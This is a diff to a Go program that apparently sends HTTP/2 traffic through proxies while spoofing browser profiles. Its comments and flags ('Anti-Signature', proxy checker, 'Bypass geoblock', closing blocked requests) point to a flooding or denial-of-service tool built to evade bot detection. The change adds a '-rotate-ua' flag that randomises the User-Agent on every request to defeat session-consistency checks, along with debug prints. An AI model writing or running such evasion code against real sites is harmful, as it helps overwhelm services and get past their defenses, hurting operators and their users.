@@ -54,6 +54,7 @@ var (
 	verifyProxies    bool
 	originRaw        string
 	cpuLimit int
+	rotateUserAgent bool  // New flag to control User-Agent rotation
 )
 
 // HTTP/2 Framer สำหรับ raw frame manipulation
@@ -538,6 +539,7 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 		
 		// Anti-Signature #69: Generate realistic headers with proper proxy consistency
 		browserProfile := browserProfiles[rand.Intn(len(browserProfiles))]
+		fmt.Printf("[DEBUG] Initial browser profile selected: %s\n", browserProfile.userAgent)
 		acceptLang := acceptLanguages[rand.Intn(len(acceptLanguages))]
 		
 		// Platform consistency check - ensure User-Agent matches Accept-Language geography
@@ -561,15 +563,26 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 		
 		// Override ด้วย proxy-specific attributes เพื่อสร้างความสอดคล้องใน proxy แต่หลากหลายระหว่าง proxy
 		if proxyInfo != nil {
-			// ใช้ modulo เพื่อให้ ProfileIndex อยู่ในช่วงที่ถูกต้อง
-			profileIdx := proxyInfo.ProfileIndex % len(browserProfiles)
-			browserProfile = browserProfiles[profileIdx]
+			fmt.Printf("[DEBUG] Proxy override - ProfileIndex: %d, RequestCount: %d\n", proxyInfo.ProfileIndex, proxyInfo.RequestCount)
+			
+			if rotateUserAgent {
+				// When rotation is enabled, select a random profile instead of using fixed ProfileIndex
+				profileIdx := rand.Intn(len(browserProfiles))
+				browserProfile = browserProfiles[profileIdx]
+				fmt.Printf("[DEBUG] Random profile selected (rotation enabled): %s\n", browserProfile.userAgent)
+			} else {
+				// ใช้ modulo เพื่อให้ ProfileIndex อยู่ในช่วงที่ถูกต้อง
+				profileIdx := proxyInfo.ProfileIndex % len(browserProfiles)
+				browserProfile = browserProfiles[profileIdx]
+				fmt.Printf("[DEBUG] Proxy profile selected: %s\n", browserProfile.userAgent)
+			}
 			
 			langIdx := proxyInfo.LangIndex % len(acceptLanguages)
 			acceptLang = acceptLanguages[langIdx]
 			
 			// Session consistency - ใช้ User-Agent เดิมถ้าเคยใช้แล้ว (anti-pattern #3)
-			if proxyInfo.LastUserAgent != "" && proxyInfo.RequestCount > 0 {
+			if !rotateUserAgent && proxyInfo.LastUserAgent != "" && proxyInfo.RequestCount > 0 {
+				fmt.Printf("[DEBUG] Session consistency - Using previous User-Agent: %s\n", proxyInfo.LastUserAgent)
 				// Find matching profile for stored User-Agent
 				foundProfile := false
 				for i := range browserProfiles {
@@ -585,7 +598,10 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 					proxyInfo.LastUserAgent = browserProfile.userAgent
 				}
 			} else {
-				// First request - บันทึก User-Agent ไว้
+				// First request or rotation enabled - บันทึก User-Agent ไว้
+				if rotateUserAgent {
+					fmt.Printf("[DEBUG] User-Agent rotation enabled - Using new User-Agent\n")
+				}
 				proxyInfo.LastUserAgent = browserProfile.userAgent
 			}
 			
@@ -818,6 +834,7 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 		}
 		
 		// 2. User-Agent
+		fmt.Printf("[DEBUG] Selected User-Agent: %s\n", userAgent)
 		h2_headers = append(h2_headers, [2]string{"user-agent", userAgent})
 		
 		// 3. Accept
@@ -1609,6 +1626,7 @@ func main() {
 	flag.BoolVar(&closeOption, "close", false, "Close bad/blocked requests")
 	flag.IntVar(&limit, "limit", 0, "Limit number of proxy connections")
 	flag.BoolVar(&verifyProxies, "verify", false, "Use built-in proxy checker")
+	flag.BoolVar(&rotateUserAgent, "rotate-ua", false, "Rotate User-Agent for each request (disable session consistency)")
 	flag.StringVar(&originRaw, "origin", "", "Bypass geoblock (US,CN,NL)")
 	flag.IntVar(&cpuLimit, "cpu", 0, "Limit number of cpu's")
 	flag.Parse()
